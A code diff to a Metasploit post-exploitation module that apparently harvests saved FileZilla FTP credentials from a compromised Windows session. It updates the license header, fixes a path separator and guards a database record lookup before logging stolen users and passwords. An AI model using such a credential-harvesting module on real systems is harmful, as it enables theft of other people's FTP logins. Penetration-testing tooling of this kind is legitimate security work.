@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -105,8 +105,8 @@ class Metasploit3 < Msf::Post
 		print_status("Checking for Filezilla directory in: #{filezilladir}")
 		session.fs.dir.foreach(filezilladir) do |dir|
 			if dir =~ /FileZilla/
-				print_status("Found #{filezilladir}#{dir}")
-				return "#{filezilladir}#{dir}"
+				print_status("Found #{filezilladir}\\#{dir}")
+				return "#{filezilladir}\\#{dir}"
 			end
 		end
 		return nil
@@ -159,11 +159,16 @@ class Metasploit3 < Msf::Post
 			end
 			creds.each do |cred|
 				cred.each do |loot|
+					if session.db_record
+						source_id = session.db_record.id
+					else
+						source_id = nil
+					end
 					report_auth_info(
 						:host  => loot['host'],
 						:port => loot['port'],
-						:sname => 'FTP',
-						:source_id => session.db_record.id,
+						:sname => 'ftp',
+						:source_id => source_id,
 						:source_type => "exploit",
 						:user => loot['user'],
 						:pass => loot['password'])
